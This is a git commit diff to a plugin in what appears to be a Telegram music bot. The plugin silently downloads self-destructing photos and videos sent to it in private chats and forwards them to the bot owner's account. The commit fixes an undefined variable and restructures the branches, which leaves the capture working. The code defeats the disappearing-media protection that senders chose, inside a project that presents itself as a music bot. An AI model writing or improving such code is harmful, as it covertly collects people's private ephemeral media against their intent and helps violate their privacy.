a55d6dfc23707cee9f801a35604db039bef50bd3
l888lmn <deakoking85@gmail.com>
2024-10-07 01:15:14 +0300

    Update savewena.py

--- plugins/savewena.py
+++ plugins/savewena.py
@@ -1,21 +1,19 @@
 from AlinaMusic import app
-from AlinaMusic.utils.database import get_assistant
 from config import OWNER_ID
 from pyrogram import filters, idle
-
+from AlinaMusic.utils.database import get_assistant
 
 @app.on_message(filters.media & filters.private)
 async def get_dest(app, message):
-    userbot = await get_assistant(chat_id)
+    userbot = await get_assistant(message.from_user.id)  # Fetch the userbot based on the sender's ID
+
     # To save Self-Destructing photo
     if message.photo and message.photo.ttl_seconds:
         photo = await message.download()
-        return await userbot.send_photo(OWNER_ID, photo)
+        await userbot.send_photo(OWNER_ID, photo)
 
     # To save Self-Destructing Video
-    if message.video and message.video.ttl_seconds:
+    elif message.video and message.video.ttl_seconds:
         video = await message.download()
-        return await userbot.send_video(OWNER_ID, video)
-
-
+        await userbot.send_video(OWNER_ID, video)
 idle()
